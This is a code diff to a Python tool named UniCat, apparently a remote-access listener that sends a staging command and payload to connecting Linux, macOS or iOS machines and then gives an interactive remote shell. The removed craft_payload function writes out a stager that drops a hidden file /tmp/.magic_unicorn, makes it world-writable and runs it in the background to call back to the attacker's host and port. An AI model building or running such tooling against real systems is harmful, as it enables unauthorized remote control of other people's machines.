@@ -11,11 +11,14 @@ from datetime import datetime
 from core.handler import handler
 from core.badges import badges
 from core.helper import helper
+from core.unicorn import unicorn
+from core.crafter import crafter
 
 class UniCat:
     def __init__(self):
         self.badges = badges()
         self.helper = helper()
+        self.crafter = crafter()
 
     def get_module(self, mu, name, folderpath):
         folderpath_list = folderpath.split(".")
@@ -49,42 +52,14 @@ class UniCat:
         universal_commands = self.import_modules("modules/universal")
         target_commands = self.import_modules("modules/" + target_system)
 
-    def craft_payload(self, LHOST, LPORT, target_system):
-        if target_system in ["Linux", "macOS", "iOS"]:
-            print(self.badges.G + "Sending "+target_system+" payload...")
-            if os.path.exists("data/payload/"+target_system+"/magic_unicorn.py"):
-                f = open("data/payload/"+target_system+"/magic_unicorn.py", "rb")
-                payload = f.read()
-                f.close()
-                instructions = \
-                "cat >/tmp/.magic_unicorn;"+\
-                "chmod 777 /tmp/.magic_unicorn;"+\
-                "python3 /tmp/.magic_unicorn "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
-                print(self.badges.G + "Executing "+target_system+" payload...")
-                return (instructions, payload)
-            else:
-                print(self.badges.E +"Failed to craft "+target_system+" payload!")
-                sys.exit()
-        else:
-            print(self.badges.E +"Unrecognized target system!")
-            sys.exit()
-
     def help(self):
         self.helper.show_commands(universal_commands, target_commands)
 
-    def get_prompt_information(self):
-        username = ['username']
-        unicorn.send(str(username).encode("UTF-8"))
-        username = unicorn.recv()
-        hostname = ['hostname']
-        unicorn.send(str(hostname).encode("UTF-8"))
-        hostname = unicorn.recv()
-        return (username.decode("UTF-8", "ignore"), hostname.decode("UTF-8", "ignore"))
-
     def shell(self):
+        username = unicorn.send_command("username")
+        hostname = unicorn.send_command("hostname")
         while True:
             try:
-                username, hostname = self.get_prompt_information()
                 command = str(input("({}{}@{}{})> ".format(self.badges.GREEN, username, hostname, self.badges.RESET)))
                 while not command.strip():
                     command = str(input("({}{}@{}{})> ".format(self.badges.GREEN, username, hostname, self.badges.RESET)))
@@ -95,7 +70,7 @@ class UniCat:
                     self.help()
                 elif command[0] == "exit":
                     print(self.badges.G + "Cleaning up...")
-                    unicorn.send("exit".encode("UTF-8"))
+                    unicorn.send_command("exit", None, False)
                     c.close()
                     s.close()
                     sys.exit()
@@ -136,7 +111,7 @@ class UniCat:
                 print(self.badges.E +"An error occurred: "+str(e)+"!")
 
     def server(self, LHOST, LPORT, handler=handler):
-        global s, a, c, target_system, unicorn
+        global s, a, c, unicorn, target_system
     
         print(self.badges.G + "Binding to " + LHOST + ":" + str(LPORT) + "...")
         try:
@@ -171,7 +146,7 @@ class UniCat:
             else:
                 target_system = "Unknown"
         
-            bash_stager, executable = self.craft_payload(LHOST, LPORT, target_system)
+            bash_stager, executable = self.crafter.craft_payload(LHOST, LPORT, target_system)
         
             c.send(bash_stager.encode())
             c.send(executable)
@@ -180,7 +155,7 @@ class UniCat:
             print(self.badges.G + "Establishing connection...")
             c, a = s.accept()
 
-            unicorn = handler(c)
+            unicorn = unicorn(handler(c))
             self.load_modules()
             self.shell()
         except (KeyboardInterrupt, EOFError):
